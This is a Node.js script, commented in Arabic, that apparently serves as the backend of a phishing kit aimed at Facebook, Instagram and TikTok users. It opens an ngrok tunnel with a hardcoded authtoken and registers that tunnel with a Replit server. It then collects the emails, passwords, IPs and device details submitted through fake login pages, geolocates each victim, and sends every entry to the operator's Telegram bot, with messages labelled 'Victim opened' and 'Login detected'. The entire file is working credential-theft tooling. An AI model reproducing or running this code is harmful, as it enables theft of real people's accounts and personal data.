#!/usr/bin/env node
const express = require('express');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const ua = require('ua-parser-js');
const readline = require('readline');
const ngrok = require('ngrok');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = q => new Promise(res => rl.question(q, ans => res(ans)));

// ⚠️ **ضع authtoken الخاص بك هنا**
const NGROK_AUTHTOKEN = '38mc2w2EyUN2iVIdshobYAw5KM9_4nD4gvkodBtKqGqsQWcbX';

// ⚠️ **رابط Replit الخاص بك**
const CENTRAL_SERVER = 'https://central-server--mosmanhacker.replit.app';

// ⚠️ **أسماء حسابات GitHub الثانوية**
const PAGES = {
  fb: 'https://mosmanhacker.github.io/fb',
  ig: 'https://instagram-mosmanhem.github.io/ig',
  tt: 'https://tiktok-mosmanhem.github.io/tt'
};

async function main() {
  const TOKEN = await ask('BOT_TOKEN: ');
  const MASTER = await ask('MASTER_ID: ');

  console.log('\n1- Facebook\n2- Instagram\n3- TikTok');
  const c = await ask('Select page (1-3): ');
  const p = ['fb', 'ig', 'tt'][parseInt(c) - 1] || 'fb';
  rl.close();

  console.log('\n🌀 Starting ngrok automatically...');

  // ✅ تشغيل ngrok داخلياً
  const ngrokUrl = await ngrok.connect({
    addr: 8080,
    authtoken: NGROK_AUTHTOKEN,
    region: 'ap' // Asia Pacific لأقرب سرعة
  });

  console.log(`✅ ngrok ready → ${ngrokUrl}\n`);

  require('fs').writeFileSync('.env', `TOKEN=${TOKEN}\nMASTER=${MASTER}\nNGROK=${ngrokUrl}`);

  const bot = new Telegraf(TOKEN);
  const app = express();
  app.use(express.json({ limit: '1mb' }));
  app.use(express.urlencoded({ extended: true }));

  bot.telegram.sendMessage(MASTER, `✅ Connected!`).catch(() => {});

  const ext = `${PAGES[p]}/?id=${MASTER}`;
  console.log(`🌍 Public URL: ${ext}\n`);

  // ✅ تسجيل ngrok URL في Replit
  await axios.post(`${CENTRAL_SERVER}/register`, { id: MASTER, platform: p, webhook: ngrokUrl })
    .then(() => console.log(`[OK] Registered successfully`))
    .catch(e => console.log(`[WARN] ${e.message}`));

  // ✅ استقبال البيانات
  app.post('/', async (q, r) => {
    const { id, email, pass, ua: s, ip } = q.body;
    if (id !== MASTER) return r.sendStatus(403);

    const dev = ua(s || q.headers['user-agent']);
    const geo = await axios.get(`http://ip-api.com/json/${ip}`).catch(() => ({ data: {} }));

    if (!email && !pass) {
      const msg = `🔥 Victim opened\nPlatform: ${p}\nIP: ${ip}\nCountry: ${geo.data.country || '?'}\nDevice: ${dev.os.name || '?'} ${dev.device.model || ''}\nBrowser: ${dev.browser.name || '?'}`;
      bot.telegram.sendMessage(MASTER, msg).catch(() => {});
    } else {
      const msg = `✅ Login detected\nPlatform: ${p}\nEmail: ${email}\nPass: ${pass}\nIP: ${ip}`;
      bot.telegram.sendMessage(MASTER, msg).catch(() => {});
    }
    r.sendStatus(200);
  });

  bot.launch();
  app.listen(8080, '0.0.0.0', () => console.log('\nServer running on http://0.0.0.0:8080\n'));
}
main();
